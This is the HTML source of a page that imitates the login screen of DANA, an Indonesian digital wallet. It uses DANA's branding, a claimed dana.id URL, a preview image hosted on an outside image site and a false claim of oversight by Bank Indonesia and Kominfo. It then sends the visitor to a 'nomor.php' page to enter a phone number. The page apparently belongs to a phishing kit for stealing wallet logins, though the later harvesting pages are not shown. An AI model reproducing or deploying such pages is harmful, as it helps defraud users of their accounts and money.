<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <meta name="theme-color" content="#108BE5">
        <title>DANA - Apa pun transaksinya selalu ada DANA</title>
        <meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
        <meta property="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA">
        <meta property="twitter:card" content="summary_large_image">
        <meta property="og:image:type" content="image/jpeg">
        <meta property="og:image" content="https://i.ibb.co/f2tqhtw/images-6.jpg" >
        <meta property="twitter:image:src" content="https://i.ibb.co/f2tqhtw/images-6.jpg">
        <meta property="og:url" content="https://dana.id">
        <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!"><meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
     
        <link rel="stylesheet" href="ast/index.css">
        <link rel="stylesheet" href="ast/00b9d2e9f52e505c013c16bb638a42a4.css">
        <link rel="stylesheet" href="ast/6990a7033bbaeadc2040ac863ff124fd.css">
        <link rel="stylesheet" href="ast/3fadc676582b9542004b502ee03df3a3.css">
        <link rel="stylesheet" href="ast/47e4c58f6b9789b8a33f2525cf084599.css">
        </head>
        <body>
    
    <div style="display:none;" class="index">
     <div class="header">
            <img src="ast/img/dana_logo.png" class="logo" alt="">
        </div>
          <div class="content">
            <div class="hero">
             <img src="ast/hero.svg" alt="">
             </div>
             <h1>Dompet digital untuk kamu!</h1>
             <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA
             </p>
             <div class="line">
             </div>
             <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
             <button type="button" onclick="next();">LOGIN</button>
            </div>
            
    </div>     

    <div sty class="start" style="display:none;">
        <img class="logo" src="ast/dn.png">
        <div class="start" style="display:none;">
                <img class="logo" src="ast/dn.png">
                  <div class="footimg">
                     <img src="ast/img/bi.png" alt="">
                       <img src="ast/img/kom.png" alt="">
                      <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
                  </div>
              </div>
      </div>

    <div class=" container hid">
    <div class="content-slide">
            <img class="dana_logo" src="ast/img/dana_logo.png" alt="" />
            <div class="imgslide fade">
                <div class="numberslide">1 / 3</div>
                <img src="ast/v1.gif" alt="">
            </div>

            <div class="imgslide fade">
                <div class="numberslide">2 / 3</div>
                <img src="ast/v2.gif" alt="">
            </div>

            <div class="imgslide fade">
                <div class="numberslide">3 / 3</div>
                <img src="ast/v3.gif" alt="">
            </div>
        </div>
        <center class="font">
           <h2 class="h2dompet">Dompet digital untuk kamu!</h2>
           <p class="psimpan">Simpan uang serta kartu debit/kredit <br />dengan praktis di DANA</p>
        </center>
        <br />
        <div class="page">
            <span class="dot" onClick="dotslide(1)"></span>
            <span class="dot" onClick="dotslide(2)"></span>
            <span class="dot" onClick="dotslide(3)"></span>
        </div>
        <br />
        <center>
            <p style="font-size: 15px;">Masukkan<strong> nomor HP</strong> kamu untuk melanjutkan</p>
        </center>
        
       
        
        <div class="input_non" onclick="location.href='nomor.php'">
            <img class="flag" src="ast/img/indo.png" alt="" />
            <label for="+63">+62</label>
            <span>811-1234-5678</span> 
        </div>
        
    </div>
    
    
    </div>
    </div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js">
</script>
<script src="ast/jquery.mask.min.js"></script>

<script>window.onload = function()
{
        setTimeout(function(){
            $(".start").fadeIn();
            setTimeout(function(){
                $(".start").fadeOut(1000);
                setTimeout(function(){
                   $(".container").fadeIn(200);
                   $("#inp").focus();
                },1000);
            },2000);
        },500);
}
</script>

</body>
 <script>
        var slideIndex = 1;
            showSlide(slideIndex);

        function nextslide(n){
            showSlide(slideIndex += n);
        }

        function dotslide(n){
            showSlide(slideIndex = n);
        }

        function showSlide(n) {
            var i;
            var slides = document.getElementsByClassName("imgslide");
            var dot = document.getElementsByClassName("dot");
            
            if (n > slides.length) {
                slideIndex = 1
            }
            if (n < 1) {
                slideIndex = slides.length;
            }
            for (i = 0; i < slides.length; i++) {
                
                slides[i].style.display = "none";
            }

            for (i = 0; i < slides.length; i++) {
                
                dot[i].className = dot[i].className.replace(" active", "");
            }

            slides[slideIndex - 1].style.display = "block";

            dot[slideIndex - 1].className += " active";
            


        }
    </script>
</html>
